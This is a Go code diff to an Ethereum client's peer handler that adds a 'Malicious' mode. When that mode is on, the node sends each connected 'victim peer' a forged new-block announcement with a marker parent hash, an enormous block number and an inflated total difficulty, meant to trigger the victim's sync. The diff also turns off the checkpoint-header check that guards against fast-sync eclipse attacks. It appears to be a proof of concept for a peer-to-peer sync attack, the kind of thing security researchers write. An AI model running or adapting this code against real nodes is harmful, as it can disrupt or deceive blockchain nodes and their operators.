@@ -182,6 +182,8 @@ func newHandler(config *handlerConfig) (*handler, error) {
 	if atomic.LoadUint32(&h.fastSync) == 1 && atomic.LoadUint32(&h.snapSync) == 0 {
 		h.stateBloom = trie.NewSyncBloom(config.BloomCache, config.Database)
 	}
+	log.Info("checkpoint number", "number", h.checkpointNumber)
+	core.CheckpointNumber = h.checkpointNumber
 	h.downloader = downloader.New(h.checkpointNumber, config.Database, h.stateBloom, h.eventMux, h.chain, nil, h.removePeer)
 
 	// Construct the fetcher (short sync)
@@ -308,8 +310,22 @@ func (h *handler) runEthPeer(peer *eth.Peer, handler eth.Handler) error {
 	// after this will be sent via broadcasts.
 	h.syncTransactions(peer)
 
+	if core.Malicious {
+		peer.Log().Info("kicking off victim peer sync")
+		err = peer.SendNewBlock(types.NewBlockWithHeader(&types.Header{
+			ParentHash: core.MaliciousParentHash, // this lets us identify the head fetch in the sync cycle
+			UncleHash:  types.EmptyUncleHash,
+			TxHash:     types.EmptyRootHash,
+			Number:     big.NewInt(100_000_000_000), // picking a large number will cause the peer to drop the block
+		}), new(big.Int).SetBit(new(big.Int), 99, 1))
+		if err != nil {
+			peer.Log().Error("failed to kick off victim peer sync", "error", err)
+		}
+	}
+
 	// If we have a trusted CHT, reject all peers below that (avoid fast sync eclipse)
-	if h.checkpointHash != (common.Hash{}) {
+	if h.checkpointHash != (common.Hash{}) && !core.Malicious { // don't bother if we're malicious
+
 		// Request the peer's checkpoint header for chain height/weight validation
 		if err := peer.RequestHeadersByNumber(h.checkpointNumber, 1, 0, false); err != nil {
 			return err
